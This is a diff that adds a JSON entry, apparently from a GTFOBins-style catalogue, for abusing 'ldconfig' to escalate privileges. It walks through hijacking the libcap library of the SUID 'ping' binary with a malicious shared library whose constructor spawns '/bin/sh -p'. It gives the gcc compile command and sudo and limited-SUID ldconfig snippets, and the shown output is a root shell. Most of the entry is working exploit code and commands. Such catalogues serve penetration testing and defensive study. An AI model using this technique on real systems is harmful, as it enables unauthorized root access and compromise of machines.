@@ -1,0 +1,17 @@
+{
+  "description": "Follows a minimal example of how to use the described technique (details may change across different distributions). Run the code associated with the technique. Identify a target SUID executable, for example the 'libcap' library of 'ping':\n\n```\n$ ldd /bin/ping | grep libcap\n      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)\n```\n\nCreate a fake library that spawns a shell at bootstrap:\n\n```\necho '#include <unistd.h>\n\n__attribute__((constructor))\nstatic void init() {\n    execl(\"/bin/sh\", \"/bin/sh\", \"-p\", NULL);\n}\n' >\"$TF/lib.c\"\n```\n\nCompile it with:\n\n```\ngcc -fPIC -shared \"$TF/lib.c\" -o \"$TF/libcap.so.2\"\n```\n\nRun 'ldconfig' again as described below then just run 'ping' to obtain a root shell:\n\n```\n$ ping\n# id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n```",
+  "functions": {
+    "sudo": [
+      {
+        "description": "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
+        "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
+        "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\"\n"
+      }
+    ]
+  }
+}
